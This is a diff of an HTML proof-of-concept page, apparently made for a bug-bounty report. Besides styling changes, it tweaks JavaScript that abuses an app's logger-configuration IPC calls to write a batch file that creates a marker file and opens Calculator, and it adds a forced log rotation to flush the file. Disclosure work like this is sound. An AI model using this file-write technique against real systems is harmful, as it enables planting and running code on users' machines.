@@ -8,23 +8,22 @@
   :root{color-scheme:dark}
   *{box-sizing:border-box}
   body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:#0d1117;color:#e6edf3;
-       margin:0;padding:26px;font-size:15px}
+       margin:0;padding:22px;font-size:14.5px}
   .hdr{display:flex;align-items:center;gap:10px;margin-bottom:6px}
   .logo{width:34px;height:34px;border-radius:8px;background:#7c6cf0;display:flex;
         align-items:center;justify-content:center;font-weight:700}
-  h1{font-size:21px;margin:0}
-  .sub{color:#8b949e;font-size:13px;margin:0 0 20px}
-  .panel{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;margin-bottom:16px}
-  .row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;
+  h1{font-size:20px;margin:0}
+  .sub{color:#8b949e;font-size:13px;margin:0 0 16px}
+  .panel{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px;margin-bottom:14px}
+  .row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;
        border-bottom:1px solid #21262d;font-size:14px}
   .row:last-child{border-bottom:0}
   .pill{padding:3px 11px;border-radius:20px;font-weight:600;font-size:12px;background:#30363d;color:#c9d1d9}
   .ok{background:#1a7f37;color:#fff}
   .bad{background:#8b2c2c;color:#fff}
   .wip{background:#9e6a03;color:#fff}
-  pre{background:#000;border:1px solid #30363d;border-radius:8px;padding:13px;
-      font-size:12.5px;line-height:1.55;white-space:pre-wrap;margin:0;color:#c9d1d9}
-  code{color:#79c0ff}
+  pre{background:#000;border:1px solid #30363d;border-radius:8px;padding:12px;
+      font-size:12px;line-height:1.5;white-space:pre-wrap;margin:0;color:#c9d1d9}
 </style>
 </head>
 <body>
@@ -76,7 +75,10 @@
     return;
   }
 
+  // Leading newline absorbs the logger's own timestamp/prefix on its own line,
+  // so every payload line below starts cleanly at column 0.
   const bat = [
+    '',
     '@echo off',
     'echo H1-POC-EXECUTED > C:\\Users\\Public\\h1poc-executed.txt',
     'start "" explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"'
@@ -90,6 +92,15 @@
     log('write_logs ERR ' + e);
     pill('p4', 'FAILED', 'bad');
     return;
+  }
+
+  // Force the appender to rotate/close so the buffer is flushed to disk now,
+  // rather than whenever the process happens to exit.
+  try {
+    await I.invoke('set_file_logger_config', { config: { path: 'C:\\Users\\Public\\rotate.flush' } });
+    log('flush (rotate) -> done');
+  } catch (e) {
+    log('flush ERR ' + e);
   }
 
   log('');
